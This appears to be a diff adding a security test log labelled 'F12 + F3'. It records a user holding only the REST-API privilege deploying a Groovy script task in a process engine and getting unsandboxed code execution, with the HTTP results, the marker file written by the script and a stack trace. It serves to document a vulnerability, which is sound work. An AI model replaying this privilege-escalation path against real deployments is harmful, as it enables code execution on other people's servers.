@@ -1,0 +1,16 @@
+
+=== F12 + F3: access-rest-api-only user deploys a Groovy scriptTask => arbitrary code execution ===
+$ idm: POST /idm-api/privileges/362cd295-.../users  {"userId":"lowpriv"}   => 200
+$ lowpriv reachability (holds access-rest-api only, NOT access-admin)
+  200  /service/runtime/process-instances
+  200  /service/repository/deployments
+  200  /service/identity/users
+  403  /actuator
+  403  /actuator/env
+
+$ deploy groovyRceProbe.bpmn20.xml as lowpriv        => HTTP 201
+$ POST /runtime/process-instances {processDefinitionKey: groovyRceProbe} => HTTP 500 (script threw after the write)
+
+--- file written by the uploaded Groovy script (no sandbox) ---
+GROOVY_ARBITRARY_CODE_EXEC jvm=17.0.20.1 user=rinne--- engine stack ---
+org.codehaus.groovy.jsr223.GroovyScriptEngineImpl.eval(GroovyScriptEngineImpl.java:164) ~[groovy-jsr223-5.0.5.jar!/:5.0.5]
